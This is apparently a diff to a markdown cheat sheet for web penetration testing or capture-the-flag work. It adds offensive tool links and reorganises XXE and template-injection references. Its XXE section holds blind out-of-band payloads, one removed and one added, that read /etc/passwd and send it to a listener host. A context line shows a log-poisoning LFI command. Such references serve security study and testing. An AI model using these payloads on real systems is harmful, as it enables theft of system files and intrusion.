@@ -21,6 +21,8 @@
 - [CloudFlair](https://github.com/christophetd/CloudFlair)
 - [Commix](https://github.com/commixproject/commix)
 - [Curl (cheatsheet)](https://devhints.io/curl)
+- [Evilarc](https://github.com/ptoomey3/evilarc)
+- [Graphqlmap](https://github.com/swisskyrepo/GraphQLmap)
 - [Jwt_tool](https://github.com/ticarpi/jwt_tool)
 - [JWS](https://www.npmjs.com/package/jws)
 - [LFISuite](https://github.com/D35m0nd142/LFISuite)
@@ -29,8 +31,7 @@
 - [Nuclei](https://red-security.fr/t/tutoriel-nuclei/92)
 - [RSS Validator](https://validator.w3.org/feed/)
 - [Tplmap](https://github.com/epinna/tplmap)
-- [Wayback machine ](https://archive.org)
-- https://archive.md/
+- [Sqlmap](https://github.com/sqlmapproject/sqlmap/wiki/Usage)
 
 
 ## API & CRUD
@@ -189,18 +190,19 @@ curl http://localhost:8000/test.php?page=/var/log/apache2/access.log&cmd=id
 - https://github.com/BuffaloWill/oxml_xxe
 - https://book.hacktricks.xyz/pentesting-web/xxe-xee-xml-external-entity
 - https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection#xxe-inside-docx-file
-- https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XXE%20Injection/README.md#xxe-oob-with-dtd-and-php-filter
+
 
 #### Blind XXE, Exflitration Out of Band
 
-- `generate file with oxml_xxe`
-- `a.dtd content:`
+- https://github.com/w181496/Web-CTF-Cheatsheet#out-of-band-oob-xxe
+- https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XXE%20Injection/README.md#xxe-oob-with-dtd-and-php-filter
+- **Method**:
+  - create *docx* using `oxml_xxe`, edit  `word/document.xml` with `<!ENTITY % sp SYSTEM "http://localhost:4444/a.dtd">`
+  - `a.dtd`/`dtd.xml` content
 
 ```xml
-<!ENTITY % file SYSTEM "file:///etc/passwd">
-<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'https://SERVER/leak?x=%file;'>">
-%eval;
-%exfil;
+<!ENTITY % data SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
+<!ENTITY % param1 "<!ENTITY exfil SYSTEM 'http://localhost:4444/a.dtd?%data;'>">
 ```
 
 ### Insecure File Uploads (Docx XXE to RCE, Imagetragick)
@@ -375,13 +377,14 @@ https://www.vulnerable.com/search?id=23277%22}},{%22$lookup%22:{%22from%22:%22fl
 
 - https://github.com/vladko312/Research_Successful_Errors/
 - https://cheatsheet.hackmanit.de/template-injection-table/
-- https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/ASP.md
-- https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/Java.md
-- https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/JavaScript.md
-- https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/PHP.md
-- https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/Python.md
-- https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/Ruby.md
 
+### ASP, Elixir, Java, JS, PHP, Python, Ruby
+
+- https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection
+
+### Golang
+
+- https://github.com/w181496/Web-CTF-Cheatsheet#golang
 
 ## Insecure Deserialization
 
